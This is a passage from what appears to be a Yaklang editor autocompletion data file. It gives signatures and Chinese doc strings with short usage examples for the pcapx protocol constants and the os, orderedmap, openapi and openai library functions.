            document: "pcapx.IPV4_FLAG_EVIL_BIT: int = 0x4",
            definitionStr: "pcapx.IPV4_FLAG_EVIL_BIT: int = 0x4",
          },
          {
            functionName: "IPV4_FLAG_DONT_FRAGMENT",
            document: "pcapx.IPV4_FLAG_DONT_FRAGMENT: int = 0x2",
            definitionStr: "pcapx.IPV4_FLAG_DONT_FRAGMENT: int = 0x2",
          },
          {
            functionName: "ICMP_TYPE_TIME_EXCEEDED",
            document: "pcapx.ICMP_TYPE_TIME_EXCEEDED: int = 0xb",
            definitionStr: "pcapx.ICMP_TYPE_TIME_EXCEEDED: int = 0xb",
          },
          {
            functionName: "ICMP_TYPE_TIMESTAMP_REPLY",
            document: "pcapx.ICMP_TYPE_TIMESTAMP_REPLY: int = 0xe",
            definitionStr: "pcapx.ICMP_TYPE_TIMESTAMP_REPLY: int = 0xe",
          },
          {
            functionName: "ICMP_TYPE_TIMESTAMP",
            document: "pcapx.ICMP_TYPE_TIMESTAMP: int = 0xd",
            definitionStr: "pcapx.ICMP_TYPE_TIMESTAMP: int = 0xd",
          },
          {
            functionName: "ICMP_TYPE_SRC_QUENCH",
            document: "pcapx.ICMP_TYPE_SRC_QUENCH: int = 0x4",
            definitionStr: "pcapx.ICMP_TYPE_SRC_QUENCH: int = 0x4",
          },
          {
            functionName: "ICMP_TYPE_ROUTER_SOLICITATION",
            document: "pcapx.ICMP_TYPE_ROUTER_SOLICITATION: int = 0xa",
            definitionStr: "pcapx.ICMP_TYPE_ROUTER_SOLICITATION: int = 0xa",
          },
          {
            functionName: "ICMP_TYPE_ROUTER_ADVERTISEMENT",
            document: "pcapx.ICMP_TYPE_ROUTER_ADVERTISEMENT: int = 0x9",
            definitionStr: "pcapx.ICMP_TYPE_ROUTER_ADVERTISEMENT: int = 0x9",
          },
          {
            functionName: "ICMP_TYPE_REDIRECT",
            document: "pcapx.ICMP_TYPE_REDIRECT: int = 0x5",
            definitionStr: "pcapx.ICMP_TYPE_REDIRECT: int = 0x5",
          },
          {
            functionName: "ICMP_TYPE_PARAM_PROBLEM",
            document: "pcapx.ICMP_TYPE_PARAM_PROBLEM: int = 0xc",
            definitionStr: "pcapx.ICMP_TYPE_PARAM_PROBLEM: int = 0xc",
          },
          {
            functionName: "ICMP_TYPE_INFO_REQUEST",
            document: "pcapx.ICMP_TYPE_INFO_REQUEST: int = 0xf",
            definitionStr: "pcapx.ICMP_TYPE_INFO_REQUEST: int = 0xf",
          },
          {
            functionName: "ICMP_TYPE_INFO_REPLY",
            document: "pcapx.ICMP_TYPE_INFO_REPLY: int = 0x10",
            definitionStr: "pcapx.ICMP_TYPE_INFO_REPLY: int = 0x10",
          },
          {
            functionName: "ICMP_TYPE_ECHO_REQUEST",
            document: "pcapx.ICMP_TYPE_ECHO_REQUEST: int = 0x8",
            definitionStr: "pcapx.ICMP_TYPE_ECHO_REQUEST: int = 0x8",
          },
          {
            functionName: "ICMP_TYPE_ECHO_REPLY",
            document: "pcapx.ICMP_TYPE_ECHO_REPLY: int = 0x0",
            definitionStr: "pcapx.ICMP_TYPE_ECHO_REPLY: int = 0x0",
          },
          {
            functionName: "ICMP_TYPE_DEST_UNREACH",
            document: "pcapx.ICMP_TYPE_DEST_UNREACH: int = 0x3",
            definitionStr: "pcapx.ICMP_TYPE_DEST_UNREACH: int = 0x3",
          },
          {
            functionName: "ICMP_TYPE_ADDRESS_MASK_REQUEST",
            document: "pcapx.ICMP_TYPE_ADDRESS_MASK_REQUEST: int = 0x11",
            definitionStr: "pcapx.ICMP_TYPE_ADDRESS_MASK_REQUEST: int = 0x11",
          },
          {
            functionName: "ICMP_TYPE_ADDRESS_MASK_REPLY",
            document: "pcapx.ICMP_TYPE_ADDRESS_MASK_REPLY: int = 0x12",
            definitionStr: "pcapx.ICMP_TYPE_ADDRESS_MASK_REPLY: int = 0x12",
          },
          {
            functionName: "ICMP_CODE_UNREACH_SRC_ROUTE_FAIL",
            document: "pcapx.ICMP_CODE_UNREACH_SRC_ROUTE_FAIL: int = 0x5",
            definitionStr: "pcapx.ICMP_CODE_UNREACH_SRC_ROUTE_FAIL: int = 0x5",
          },
          {
            functionName: "ICMP_CODE_UNREACH_SRC_ISOLATED",
            document: "pcapx.ICMP_CODE_UNREACH_SRC_ISOLATED: int = 0x8",
            definitionStr: "pcapx.ICMP_CODE_UNREACH_SRC_ISOLATED: int = 0x8",
          },
          {
            functionName: "ICMP_CODE_UNREACH_PROTOCOL",
            document: "pcapx.ICMP_CODE_UNREACH_PROTOCOL: int = 0x2",
            definitionStr: "pcapx.ICMP_CODE_UNREACH_PROTOCOL: int = 0x2",
          },
          {
            functionName: "ICMP_CODE_UNREACH_PRECEDENCE_CUTOFF",
            document: "pcapx.ICMP_CODE_UNREACH_PRECEDENCE_CUTOFF: int = 0xf",
            definitionStr: "pcapx.ICMP_CODE_UNREACH_PRECEDENCE_CUTOFF: int = 0xf",
          },
          {
            functionName: "ICMP_CODE_UNREACH_PORT",
            document: "pcapx.ICMP_CODE_UNREACH_PORT: int = 0x3",
            definitionStr: "pcapx.ICMP_CODE_UNREACH_PORT: int = 0x3",
          },
          {
            functionName: "ICMP_CODE_UNREACH_NET_UNKNOWN",
            document: "pcapx.ICMP_CODE_UNREACH_NET_UNKNOWN: int = 0x6",
            definitionStr: "pcapx.ICMP_CODE_UNREACH_NET_UNKNOWN: int = 0x6",
          },
          {
            functionName: "ICMP_CODE_UNREACH_NET_TOS",
            document: "pcapx.ICMP_CODE_UNREACH_NET_TOS: int = 0xb",
            definitionStr: "pcapx.ICMP_CODE_UNREACH_NET_TOS: int = 0xb",
          },
          {
            functionName: "ICMP_CODE_UNREACH_NET_ADMIN",
            document: "pcapx.ICMP_CODE_UNREACH_NET_ADMIN: int = 0x9",
            definitionStr: "pcapx.ICMP_CODE_UNREACH_NET_ADMIN: int = 0x9",
          },
          {
            functionName: "ICMP_CODE_UNREACH_NET",
            document: "pcapx.ICMP_CODE_UNREACH_NET: int = 0x0",
            definitionStr: "pcapx.ICMP_CODE_UNREACH_NET: int = 0x0",
          },
          {
            functionName: "ICMP_CODE_UNREACH_HOST_UNKNOWN",
            document: "pcapx.ICMP_CODE_UNREACH_HOST_UNKNOWN: int = 0x7",
            definitionStr: "pcapx.ICMP_CODE_UNREACH_HOST_UNKNOWN: int = 0x7",
          },
          {
            functionName: "ICMP_CODE_UNREACH_HOST_TOS",
            document: "pcapx.ICMP_CODE_UNREACH_HOST_TOS: int = 0xc",
            definitionStr: "pcapx.ICMP_CODE_UNREACH_HOST_TOS: int = 0xc",
          },
          {
            functionName: "ICMP_CODE_UNREACH_HOST_PRECEDENCE",
            document: "pcapx.ICMP_CODE_UNREACH_HOST_PRECEDENCE: int = 0xe",
            definitionStr: "pcapx.ICMP_CODE_UNREACH_HOST_PRECEDENCE: int = 0xe",
          },
          {
            functionName: "ICMP_CODE_UNREACH_HOST_ADMIN",
            document: "pcapx.ICMP_CODE_UNREACH_HOST_ADMIN: int = 0xa",
            definitionStr: "pcapx.ICMP_CODE_UNREACH_HOST_ADMIN: int = 0xa",
          },
          {
            functionName: "ICMP_CODE_UNREACH_HOST",
            document: "pcapx.ICMP_CODE_UNREACH_HOST: int = 0x1",
            definitionStr: "pcapx.ICMP_CODE_UNREACH_HOST: int = 0x1",
          },
          {
            functionName: "ICMP_CODE_UNREACH_FRAGMENTATION_NEEDED",
            document: "pcapx.ICMP_CODE_UNREACH_FRAGMENTATION_NEEDED: int = 0x4",
            definitionStr:
              "pcapx.ICMP_CODE_UNREACH_FRAGMENTATION_NEEDED: int = 0x4",
          },
          {
            functionName: "ICMP_CODE_UNREACH_COMM_ADMIN",
            document: "pcapx.ICMP_CODE_UNREACH_COMM_ADMIN: int = 0xd",
            definitionStr: "pcapx.ICMP_CODE_UNREACH_COMM_ADMIN: int = 0xd",
          },
          {
            functionName: "ICMP_CODE_TIME_EXCEEDED_TTL",
            document: "pcapx.ICMP_CODE_TIME_EXCEEDED_TTL: int = 0x0",
            definitionStr: "pcapx.ICMP_CODE_TIME_EXCEEDED_TTL: int = 0x0",
          },
          {
            functionName: "ICMP_CODE_TIME_EXCEEDED_FRAG_REASS",
            document: "pcapx.ICMP_CODE_TIME_EXCEEDED_FRAG_REASS: int = 0x1",
            definitionStr: "pcapx.ICMP_CODE_TIME_EXCEEDED_FRAG_REASS: int = 0x1",
          },
          {
            functionName: "ICMP_CODE_REDIRECT_TOS_NET",
            document: "pcapx.ICMP_CODE_REDIRECT_TOS_NET: int = 0xb",
            definitionStr: "pcapx.ICMP_CODE_REDIRECT_TOS_NET: int = 0xb",
          },
          {
            functionName: "ICMP_CODE_REDIRECT_TOS_HOST",
            document: "pcapx.ICMP_CODE_REDIRECT_TOS_HOST: int = 0xc",
            definitionStr: "pcapx.ICMP_CODE_REDIRECT_TOS_HOST: int = 0xc",
          },
          {
            functionName: "ICMP_CODE_REDIRECT_NET",
            document: "pcapx.ICMP_CODE_REDIRECT_NET: int = 0x0",
            definitionStr: "pcapx.ICMP_CODE_REDIRECT_NET: int = 0x0",
          },
          {
            functionName: "ICMP_CODE_REDIRECT_HOST",
            document: "pcapx.ICMP_CODE_REDIRECT_HOST: int = 0x1",
            definitionStr: "pcapx.ICMP_CODE_REDIRECT_HOST: int = 0x1",
          },
          {
            functionName: "ICMP_CODE_PARAM_PROBLEM_POINTER_INDICATES_ERROR",
            document:
              "pcapx.ICMP_CODE_PARAM_PROBLEM_POINTER_INDICATES_ERROR: int = 0x0",
            definitionStr:
              "pcapx.ICMP_CODE_PARAM_PROBLEM_POINTER_INDICATES_ERROR: int = 0x0",
          },
          {
            functionName: "ICMP_CODE_PARAM_PROBLEM_MISSING_OPTION",
            document: "pcapx.ICMP_CODE_PARAM_PROBLEM_MISSING_OPTION: int = 0x1",
            definitionStr:
              "pcapx.ICMP_CODE_PARAM_PROBLEM_MISSING_OPTION: int = 0x1",
          },
          {
            functionName: "ICMP_CODE_PARAM_PROBLEM_BAD_LENGTH",
            document: "pcapx.ICMP_CODE_PARAM_PROBLEM_BAD_LENGTH: int = 0x2",
            definitionStr: "pcapx.ICMP_CODE_PARAM_PROBLEM_BAD_LENGTH: int = 0x2",
          },
          {
            functionName: "GetStatistics()",
            document: "",
            definitionStr: "GetStatistics() *Statistics",
          },
        ],
      },
      {
        libName: "os",
        prefix: "os.",
        functions: [
          {
            functionName:
              "WaitConnect(${1:addr /*type: string*/}, ${2:timeout /*type: float64*/})",
            document: "",
            definitionStr:
              'WaitConnect(addr string, timeout float64) error  doc:WaitConnect 等待一个地址的端口开放或指导超时时间，如果超时则返回错误，这通常用于等待并确保一个服务启动\n\nExample:\n```\ntimeout, _ = time.ParseDuration("1m")\nctx, cancel = context.WithTimeout(context.New(), timeout)\n\n\tgo func() {\n\t    err = tcp.Serve("127.0.0.1", 8888, tcp.serverCallback(func (conn) {\n\t    conn.Send("hello world")\n\t    conn.Close()\n\t}), tcp.serverContext(ctx))\n\n\t    die(err)\n\t}()\n\nos.WaitConnect("127.0.0.1:8888", 5)~ // 等待tcp服务器启动\nconn = tcp.Connect("127.0.0.1", 8888)~\nbytes = conn.Recv()~\nprintln(string(bytes))\n```\n',
          },
          {
            functionName: "Unsetenv(${1:key /*type: string*/})",
            document: "",
            definitionStr:
              'Unsetenv(key string) error  doc:Unsetenv 删除指定的环境变量\n\nExample:\n```\nos.Unsetenv("PATH")\n```\n',
          },
          {
            functionName: "TempDir()",
            document: "",
            definitionStr:
              "TempDir() string  doc:TempDir 获取用于存放临时文件的默认目录路径\n\nExample:\n```\nos.TempDir()\n```\n",
          },
          {
            functionName: "Stdout",
            document: "os.Stdout: *os.File",
            definitionStr: "os.Stdout: *os.File",
          },
          {
            functionName: "Stdin",
            document: "os.Stdin: *os.File",
            definitionStr: "os.Stdin: *os.File",
          },
          {
            functionName: "Stderr",
            document: "os.Stderr: *os.File",
            definitionStr: "os.Stderr: *os.File",
          },
          {
            functionName:
              "Setenv(${1:key /*type: string*/}, ${2:value /*type: string*/})",
            document: "",
            definitionStr:
              'Setenv(key string, value string) error  doc:Setenv 设置指定的环境变量\n\nExample:\n```\nos.Setenv("PATH", "/usr/local/bin:/usr/bin:/bin")\n```\n',
          },
          {
            functionName:
              "Rename(${1:oldpath /*type: string*/}, ${2:newpath /*type: string*/})",
            document: "",
            definitionStr:
              'Rename(oldpath string, newpath string) error  doc:Rename 重命名文件或目录，可以用于移动文件或目录\n\nExample:\n```\nos.Rename("/tmp/test.txt", "/tmp/test2.txt")\nos.Rename("/tmp/test", "/root/test")\n```\n',
          },
          {
            functionName: "RemoveAll(${1:name /*type: string*/})",
            document: "",
            definitionStr:
              'RemoveAll(name string) error  doc:RemoveAll 递归删除指定的路径及其子路径\n\nExample:\n```\nos.RemoveAll("/tmp")\n```\n',
          },
          {
            functionName: "Remove(${1:name /*type: string*/})",
            document: "",
            definitionStr:
              'Remove(name string) error  doc:Remove 删除指定的文件或目录\n\nExample:\n```\nos.Remove("/tmp/test.txt")\n```\n',
          },
          {
            functionName: "Pipe()",
            document: "",
            definitionStr:
              'Pipe() (r *os.File, w *os.File, err error)  doc:Pipe 创建一个管道，返回一个读取端和一个写入端以及错误\n\n它实际是 io.Pipe 的别名\n\nExample:\n```\nr, w, err = os.Pipe()\ndie(err)\n\n\tgo func {\n\t    w.WriteString("hello yak")\n\t    w.Close()\n\t}\n\nbytes, err = io.ReadAll(r)\ndie(err)\ndump(bytes)\n```\n',
          },
          {
            functionName: "OS",
            document: "os.OS: string",
            definitionStr: "os.OS: string",
          },
          {
            functionName: "LookupIP(${1:i /*type: string*/})",
            document: "",
            definitionStr:
              'LookupIP(i string) []string  doc:LookupIP 通过DNS服务器，根据域名查找IP\n\nExample:\n```\nos.LookupIP("www.yaklang.com")\n```\n',
          },
          {
            functionName: "LookupHost(${1:i /*type: string*/})",
            document: "",
            definitionStr:
              'LookupHost(i string) []string  doc:LookupHost 通过DNS服务器，根据域名查找IP\n\nExample:\n```\nos.LookupHost("www.yaklang.com")\n```\n',
          },
          {
            functionName: "LookupEnv(${1:key /*type: string*/})",
            document: "",
            definitionStr:
              'LookupEnv(key string) (string, bool)  doc:LookupEnv 获取指定的环境变量的值\n\nExample:\n```\nvalue, ok = os.LookupEnv("PATH")\n```\n',
          },
          {
            functionName: "IsUDPPortOpen(${1:p /*type: int*/})",
            document: "",
            definitionStr:
              "IsUDPPortOpen(p int) bool  doc:IsUDPPortOpen 检查UDP端口是否开放\n\nExample:\n```\nos.IsUDPPortOpen(80)\n```\n",
          },
          {
            functionName: "IsUDPPortAvailable(${1:p /*type: int*/})",
            document: "",
            definitionStr:
              "IsUDPPortAvailable(p int) bool  doc:IsUDPPortAvailable 检查UDP端口是否可用\n\nExample:\n```\nos.IsUDPPortAvailable(80)\n```\n",
          },
          {
            functionName: "IsTCPPortOpen(${1:p /*type: int*/})",
            document: "",
            definitionStr:
              "IsTCPPortOpen(p int) bool  doc:IsTCPPortOpen 检查TCP端口是否开放\n\nExample:\n```\nos.IsTCPPortOpen(80)\n```\n",
          },
          {
            functionName: "IsTCPPortAvailable(${1:p /*type: int*/})",
            document: "",
            definitionStr:
              "IsTCPPortAvailable(p int) bool  doc:IsTCPPortAvailable 检查TCP端口是否可用\n\nExample:\n```\nos.IsTCPPortAvailable(80)\n```\n",
          },
          {
            functionName:
              "IsRemoteTCPPortOpen(${1:host /*type: string*/}, ${2:p /*type: int*/})",
            document: "",
            definitionStr:
              'IsRemoteTCPPortOpen(host string, p int) bool  doc:IsRemoteTCPPortOpen 检查远程TCP端口是否开放\n\nExample:\n```\nos.IsRemoteTCPPortOpen("yaklang.com", 443) // true\n```\n',
          },
          {
            functionName: "IsPrivileged",
            document: "os.IsPrivileged: bool",
            definitionStr: "os.IsPrivileged: bool",
          },
          {
            functionName: "Hostname()",
            document: "",
            definitionStr:
              "Hostname() (name string, err error)  doc:Hostname 获取主机名\n\nExample:\n```\nname, err = os.Hostname()\n```\n",
          },
          {
            functionName: "Getwd()",
            document: "",
            definitionStr:
              "Getwd() (string, error)  doc:Getwd 获取当前工作目录路径\n\nExample:\n```\ncwd, err = os.Getwd()\n```\n",
          },
          {
            functionName: "Getuid()",
            document: "",
            definitionStr:
              "Getuid() int  doc:Getuid 获取当前进程的用户ID\n\nExample:\n```\nos.Getuid()\n```\n",
          },
          {
            functionName: "Getppid()",
            document: "",
            definitionStr:
              "Getppid() int  doc:Getppid  获取当前进程的父进程ID\n\nExample:\n```\nos.Getppid()\n```\n",
          },
          {
            functionName: "Getpid()",
            document: "",
            definitionStr:
              "Getpid() int  doc:Getpid 获取当前进程的进程ID\n\nExample:\n```\nos.Getpid()\n```\n",
          },
          {
            functionName: "Getgid()",
            document: "",
            definitionStr:
              "Getgid() int  doc:Getgid 获取当前进程的组ID\n\nExample:\n```\nos.Getgid()\n```\n",
          },
          {
            functionName: "Geteuid()",
            document: "",
            definitionStr:
              "Geteuid() int  doc:Geteuid 获取当前进程的有效用户ID\n\nExample:\n```\nos.Geteuid()\n```\n",
          },
          {
            functionName: "Getenv(${1:key /*type: string*/})",
            document: "",
            definitionStr:
              'Getenv(key string) string  doc:Getenv 获取指定的环境变量的值，如果不存在则返回空字符串\n\nExample:\n```\nvalue = os.Getenv("PATH")\n```\n',
          },
          {
            functionName: "Getegid()",
            document: "",
            definitionStr:
              "Getegid() int  doc:Getegid 获取当前进程的有效组ID\n\nExample:\n```\nos.Getegid()\n```\n",
          },
          {
            functionName: "GetRandomAvailableUDPPort()",
            document: "",
            definitionStr:
              'GetRandomAvailableUDPPort() int  doc:GetRandomAvailableUDPPort 获取随机可用的UDP端口\n\nExample:\n```\nudp.Serve("127.0.0.1", os.GetRandomAvailableTCPPort())\n```\n',
          },
          {
            functionName: "GetRandomAvailableTCPPort()",
            document: "",
            definitionStr:
              'GetRandomAvailableTCPPort() int  doc:GetRandomAvailableTCPPort 获取随机可用的TCP端口\n\nExample:\n```\ntcp.Serve("127.0.0.1", os.GetRandomAvailableTCPPort())\n```\n',
          },
          {
            functionName: "GetMachineID()",
            document: "",
            definitionStr:
              "GetMachineID() string  doc:GetMachineID 获取每个机器唯一的标识符\n\nExample:\n```\nos.GetMachineID()\n```\n",
          },
          {
            functionName: "GetLocalIPv6Address()",
            document: "",
            definitionStr:
              'GetLocalIPv6Address() []string  doc:GetLocalIPv6Address 获取本地IPv6地址\n\nExample:\n```\nos.GetLocalIPv6Address() // ["fe80::605a:5ff:fefb:5405"]\n```\n',
          },
          {
            functionName: "GetLocalIPv4Address()",
            document: "",
            definitionStr:
              'GetLocalIPv4Address() []string  doc:GetLocalIPv4Address 获取本地IPv4地址\n\nExample:\n```\nos.GetLocalIPv4Address() // ["192.168.3.103"]\n```\n',
          },
          {
            functionName: "GetLocalAddress()",
            document: "",
            definitionStr:
              'GetLocalAddress() []string  doc:GetLocalAddress 获取本地IP地址\n\nExample:\n```\nos.GetLocalAddress() // ["192.168.1.103", "fe80::605a:5ff:fefb:5405"]\n```\n',
          },
          {
            functionName: "GetDefaultDNSServers()",
            document: "",
            definitionStr:
              "GetDefaultDNSServers() []string  doc:GetDefaultDNSServers 获取默认的DNS服务器ip对应的字符串切片\n\nExample:\n```\nos.GetDefaultDNSServers()\n```\n",
          },
          {
            functionName: "ExpandEnv(${1:s /*type: string*/})",
            document: "",
            definitionStr:
              'ExpandEnv(s string) string  doc:ExpandEnv  将字符串中的${var}或$var替换为其对应环境变量名的值\n\nExample:\n```\nos.ExpandEnv("PATH = $PATH")\n```\n',
          },
          {
            functionName: "Exit(${1:code /*type: int*/})",
            document: "",
            definitionStr:
              "Exit(code int)  doc:Exit 退出当前进程\n\nExample:\n```\nos.Exit(0)\n```\n",
          },
          {
            functionName: "Executable()",
            document: "",
            definitionStr:
              "Executable() (string, error)  doc:Executable 获取当前可执行文件的路径\n\nExample:\n```\npath, err = os.Executable()\n```\n",
          },
          {
            functionName: "Environ()",
            document: "",
            definitionStr:
              'Environ() []string  doc:Environ 获取表示环境变量的字符串切片，格式为"key=value"\n\nExample:\n```\nfor env in os.Environ() {\nvalue = env.SplitN("=", 2)\nprintf("key = %s, value = %v\\n", value[0], value[1])\n}\n```\n',
          },
          {
            functionName: "Clearenv()",
            document: "",
            definitionStr:
              "Clearenv()  doc:Clearenv 清空所有环境变量\n\nExample:\n```\nos.Clearenv()\n```\n",
          },
          {
            functionName:
              "Chown(${1:name /*type: string*/}, ${2:uid /*type: int*/}, ${3:gid /*type: int*/})",
            document: "",
            definitionStr:
              'Chown(name string, uid int, gid int) error  doc:Chown 改变指定文件或目录的所有者和所属组\n\nExample:\n```\nerr = os.Chown("/var/www/html/test.txt", 1000, 1000)\n```\n',
          },
          {
            functionName:
              "Chmod(${1:name /*type: string*/}, ${2:mode /*type: os.FileMode*/})",
            document: "",
            definitionStr:
              'Chmod(name string, mode os.FileMode) error  doc:Chmod 改变指定文件或目录的权限\n\nExample:\n```\nerr = os.Chmod("/tmp/test.txt", 0777)\n```\n',
          },
          {
            functionName: "Chdir(${1:dir /*type: string*/})",
            document: "",
            definitionStr:
              'Chdir(dir string) error  doc:Chdir 改变当前工作目录\n\nExample:\n```\nerr = os.Chdir("/tmp")\n```\n',
          },
          {
            functionName: "Args",
            document: "os.Args: []string",
            definitionStr: "os.Args: []string",
          },
          {
            functionName: "ARCH",
            document: "os.ARCH: string",
            definitionStr: "os.ARCH: string",
          },
        ],
      },
      {
        libName: "orderedmap",
        prefix: "orderedmap.",
        functions: [
          {
            functionName: "New(${1:maps...})",
            document: "",
            definitionStr:
              'New(maps ...any) *OrderedMap  doc:New 从零创建一个有序映射或从一个普通映射中创建一个有序映射，其的基本用法与普通映射相同，但内置方法可能不同\n\n值得注意的是，如果传入的是一个普通映射，使用此函数转换为有序映射并不能保证原有的顺序\n\n如果需要保留原有顺序，可以使用 `omap({"a": 1, "b": 2})` 来直接生成一个有序映射\n\nExample:\n```\nom = orderedmap.New()\nom["a"] = 1\nom.b = 2\nprintln(om.a) // 1\nprintln(om["b"]) // 2\nom.Delete("a")\nom.Delete("b")\nprintln(om.a) // nil\nfor i in 100 { om[string(i)] = i }\nfor k, v in om {\nprintln(k, v)\n}\n```\n',
          },
        ],
      },
      {
        libName: "openapi",
        prefix: "openapi.",
        functions: [
          {
            functionName: "https(${1:b /*type: bool*/})",
            document: "",
            definitionStr:
              "https(b bool) Option  doc:WithHttps means use https\n",
          },
          {
            functionName:
              "flowHandler(${1:handler /*type: func(flow *schema.HTTPFlow)*/})",
            document: "",
            definitionStr:
              "flowHandler(handler func(flow *schema.HTTPFlow)) Option  doc:WithFlowHandler means use this handler\n",
          },
          {
            functionName: "domain(${1:domain /*type: string*/})",
            document: "",
            definitionStr:
              "domain(domain string) Option  doc:WithDomain means use this domain\n",
          },
          {
            functionName:
              "GenerateHTTPFlows(${1:doc /*type: string*/}, ${2:opt...})",
            document: "",
            definitionStr:
              "GenerateHTTPFlows(doc string, opt ...Option) error  doc:GenerateHTTPFlows means generate yakit.HTTPFlow via openapi2/3 scheme\n\nuse WithFlowHandler to recv and handle it\n\nExample:\n\n\topenapi.Generate(fileName, openapi.flowHandler(flow => {\n\t\tdump(flow.Url)\n\t}))\n",
          },
          {
            functionName: "ExtractOpenAPI3Scheme(${1:domain /*type: string*/})",
            document: "",
            definitionStr:
              "ExtractOpenAPI3Scheme(domain string) (*openapi3.T, error)  doc:ExtractOpenAPI3Scheme fetch openapi3 scheme from yakit.HTTPFlows\n\nExample:\n\nscheme := openapi.ExtractOpenAPI3Scheme(domain)~\nschemeJSON = scheme.MarshalJSON()~\n",
          },
          {
            functionName: "ConvertYamlToJson(${1:y /*type: []byte*/})",
            document: "",
            definitionStr:
              "ConvertYamlToJson(y []byte) ([]byte, error)  doc:YAMLToJSON converts YAML to JSON. Since JSON is a subset of YAML,\npassing JSON through this method should be a no-op.\n\nThings YAML can do that are not supported by JSON:\n  - In YAML you can have binary and null keys in your maps. These are invalid\n    in JSON. (int and float keys are converted to strings.)\n  - Binary data in YAML with the !!binary tag is not supported. If you want to\n    use binary data with this library, encode the data as base64 as usual but do\n    not use the !!binary tag in your YAML. This will ensure the original base64\n    encoded data makes it all the way through to the JSON.\n",
          },
          {
            functionName: "ConvertJsonToYaml(${1:j /*type: []byte*/})",
            document: "",
            definitionStr:
              "ConvertJsonToYaml(j []byte) ([]byte, error)  doc:JSONToYAML converts JSON to YAML.\n",
          },
        ],
      },
      {
        libName: "openai",
        prefix: "openai.",
        functions: [
          {
            functionName: "yakDomain(${1:client /*type: *Client*/})",
            document: "",
            definitionStr: "yakDomain(client *Client) any",
          },
          {
            functionName: "userMessage(${1:content /*type: string*/})",
            document: "",
            definitionStr:
              'userMessage(content string) ChatDetail  doc:userMessage 根据传入的内容构造并返回一个 OpenAI 用户信息\n\nExample:\n```\nd = openai.ChatEx(\n[\nopenai.systemMessage("The weather in Boston is 72 degrees and sunny."),\nopenai.userMessage("What is the weather like today?"),\n],\n)~\n```\n',
          },
          {
            functionName:
              "toolMessageWithID(${1:id /*type: string*/}, ${2:name /*type: string*/}, ${3:content /*type: string*/})",
            document: "",
            definitionStr:
              'toolMessageWithID(id string, name string, content string) ChatDetail  doc:toolMessageWithID 根据传入的ID,函数名,内容构造并返回一个 OpenAI 工具信息，用于指示工具返回结果\n\nExample:\n```\nsession = openai.NewSession(\nopenai.proxy("http://127.0.0.1:7890")\n)\nresult = session.Chat(openai.userMessage("What is the weather like in Boston?"),\nopenai.newFunction(\n"get_current_weather",\n"Get the current weather in a given location",\nopenai.functionProperty("location", "string", "The city and state, e.g. San Francisco, CA"),\nopenai.functionRequired("location"),\n),\n)~\nresult = session.Chat(openai.toolMessage("get_current_weather", `{"degree":72,"weather":"sunny"}`))~\nprintln(result.String())\n```\n',
          },
          {
            functionName:
              "toolMessage(${1:name /*type: string*/}, ${2:content /*type: string*/})",
            document: "",
            definitionStr:
              'toolMessage(name string, content string) ChatDetail  doc:toolMessage 根据传入的函数名,内容构造并返回一个 OpenAI 工具信息，用于指示工具返回结果\n\nExample:\n```\nsession = openai.NewSession(\nopenai.proxy("http://127.0.0.1:7890")\n)\nresult = session.Chat(openai.userMessage("What is the weather like in Boston?"),\nopenai.newFunction(\n"get_current_weather",\n"Get the current weather in a given location",\nopenai.functionProperty("location", "string", "The city and state, e.g. San Francisco, CA"),\nopenai.functionRequired("location"),\n),\n)~\nresult = session.Chat(openai.toolMessage("get_current_weather", `{"degree":72,"weather":"sunny"}`))~\nprintln(result.String())\n```\n',
          },
          {
            functionName: "systemMessage(${1:content /*type: string*/})",
            document: "",
            definitionStr:
              'systemMessage(content string) ChatDetail  doc:systemMessage 根据传入的内容构造并返回一个 OpenAI 系统信息\n\nExample:\n```\nd = openai.ChatEx(\n[\nopenai.systemMessage("The weather in Boston is 72 degrees and sunny."),\nopenai.userMessage("What is the weather like today?"),\n],\n)~\n```\n',
          },
          {
            functionName: "proxy(${1:i /*type: string*/})",
            document: "",
            definitionStr:
              'proxy(i string) ConfigOption  doc:proxy 设置调用 OpenAI 时使用的代理\n\nExample:\n```\nresult = openai.TranslateToChinese("Hello, world!", openai.apiKey("sk-xxx"), openai.proxy("http://127.0.0.1:7890"))\n```\n',
          },
          {
            functionName:
              "newFunction(${1:name /*type: string*/}, ${2:description /*type: string*/}, ${3:opts...})",
            document: "",
            definitionStr:
              'newFunction(name string, description string, opts ...ConfigOption) ConfigOption  doc:newFunction 设置新的函数调用\n\n详情请参考 https://platform.openai.com/docs/guides/function-calling\n\n@param {string} name 函数名称\n\n@param {string} description 函数描述\n\n@param {ConfigOption} ...opts 配置选项，接收openai.functionParamType,openai.functionProperty,openai.functionRequired\n\n@return {ConfigOption} 配置选项\n\nExample:\n```\nf = openai.newFunction(\n"get_current_weather",\n"Get the current weather in a given location",\nopenai.functionProperty("location", "string", "The city and state, e.g. San Francisco, CA"),\nopenai.functionRequired("location"),\n)\nd = openai.ChatEx(\n[\nopenai.userMessage("What is the weather like in Boston?")\n],\nf,\nopenai.proxy("http://127.0.0.1:7890"),\n)~\nprintln(d.FunctionCallResult())\n```\n',
          },
          {
            functionName: "model(${1:i /*type: string*/})",
            document: "",
            definitionStr:
              'model(i string) ConfigOption  doc:model 设置 OpenAI的大语言模型\n\nExample:\n```\nresult = openai.TranslateToChinese("Hello, world!", openai.apiKey("sk-xxx"), openai.model("gpt-4-0613"))\n```\n',
          },
          {
            functionName: "localAPIKey(${1:client /*type: *Client*/})",
            document: "",
            definitionStr: "localAPIKey(client *Client) any",
          },
          {
            functionName: "functionRequired(${1:names...})",
            document: "",
            definitionStr:
              'functionRequired(names ...string) ConfigOption  doc:functionRequired 设置函数调用时的必须参数\n\nExample:\n```\nresultMap = openai.FunctionCall(\n"What is the weather like in Boston?",\n"get_current_weather",\n"Get the current weather in a given location",\nopenai.apiKey("sk-xxxx"),\nopenai.proxy("http://127.0.0.1:7890"),\nopenai.functionProperty("location", "string", "The city and state, e.g. San Francisco, CA"),\nopenai.functionRequired("location"))\n```\n',
          },
          {
            functionName:
              "functionProperty(${1:name /*type: string*/}, ${2:typ /*type: string*/}, ${3:description /*type: string*/}, ${4:enum...})",
            document: "",
            definitionStr:
              'functionProperty(name string, typ string, description string, enum ...[]string) ConfigOption  doc:functionProperty 设置函数调用时的单个参数属性\n\nExample:\n```\nresultMap = openai.FunctionCall(\n"What is the weather like in Boston?",\n"get_current_weather",\n"Get the current weather in a given location",\nopenai.apiKey("sk-xxxx"),\nopenai.proxy("http://127.0.0.1:7890"),\nopenai.functionProperty("location", "string", "The city and state, e.g. San Francisco, CA"),\nopenai.functionRequired("location"))\n```\n',
          },
          {
            functionName: "functionParamType(${1:i /*type: string*/})",
            document: "",
            definitionStr:
